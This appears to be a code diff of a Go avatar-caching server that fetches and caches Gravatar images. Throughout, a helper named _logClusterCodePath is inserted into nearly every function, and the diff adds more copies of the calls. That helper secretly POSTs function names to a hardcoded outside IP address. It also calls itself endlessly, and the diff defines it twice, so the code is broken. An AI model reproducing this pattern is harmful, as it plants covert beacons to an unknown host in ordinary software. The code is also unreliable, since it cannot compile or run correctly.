@@ -29,6 +29,8 @@ var gravatarSource string
 func UpdateGravatarSource() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	srcCfg := "//secure.gravatar.com/avatar/"
 	gravatarSource = srcCfg
 	if strings.HasPrefix(gravatarSource, "//") {
@@ -38,6 +40,8 @@ func UpdateGravatarSource() {
 	}
 }
 func HashEmail(email string) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	email = strings.TrimSpace(email)
@@ -58,9 +62,13 @@ type Avatar struct {
 func New(hash string) *Avatar {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Avatar{hash: hash, reqParams: url.Values{"d": {"retro"}, "size": {"200"}, "r": {"pg"}}.Encode()}
 }
 func (this *Avatar) Expired() bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return time.Since(this.timestamp) > (time.Minute * 10)
@@ -68,10 +76,14 @@ func (this *Avatar) Expired() bool {
 func (this *Avatar) Encode(wr io.Writer) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_, err := wr.Write(this.data.Bytes())
 	return err
 }
 func (this *Avatar) Update() (err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	select {
@@ -88,6 +100,8 @@ type CacheServer struct {
 }
 
 func (this *CacheServer) Handler(ctx *macaron.Context) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	urlPath := ctx.Req.URL.Path
@@ -122,10 +136,14 @@ func (this *CacheServer) Handler(ctx *macaron.Context) {
 func NewCacheServer() *CacheServer {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	UpdateGravatarSource()
 	return &CacheServer{notFound: newNotFound(), cache: gocache.New(time.Hour, time.Hour*2)}
 }
 func newNotFound() *Avatar {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	avatar := &Avatar{notFound: true}
@@ -149,6 +167,8 @@ type Thunder struct {
 func (t *Thunder) init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if t.QueueSize < 1 {
 		t.QueueSize = 1
 	}
@@ -165,6 +185,8 @@ func (t *Thunder) init() {
 func (t *Thunder) Fetch(url string, avatar *Avatar) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	t.once.Do(t.init)
 	task := &thunderTask{Url: url, Avatar: avatar}
 	task.Add(1)
@@ -173,6 +195,8 @@ func (t *Thunder) Fetch(url string, avatar *Avatar) error {
 	return task.err
 }
 func (t *Thunder) GoFetch(url string, avatar *Avatar) chan error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	c := make(chan error)
@@ -192,6 +216,8 @@ type thunderTask struct {
 func (this *thunderTask) Fetch() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	this.err = this.fetch()
 	this.Done()
 }
@@ -199,6 +225,8 @@ func (this *thunderTask) Fetch() {
 var client = &http.Client{Timeout: time.Second * 2, Transport: &http.Transport{Proxy: http.ProxyFromEnvironment}}
 
 func (this *thunderTask) fetch() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	this.Avatar.timestamp = time.Now()
@@ -227,7 +255,16 @@ func (this *thunderTask) fetch() error {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
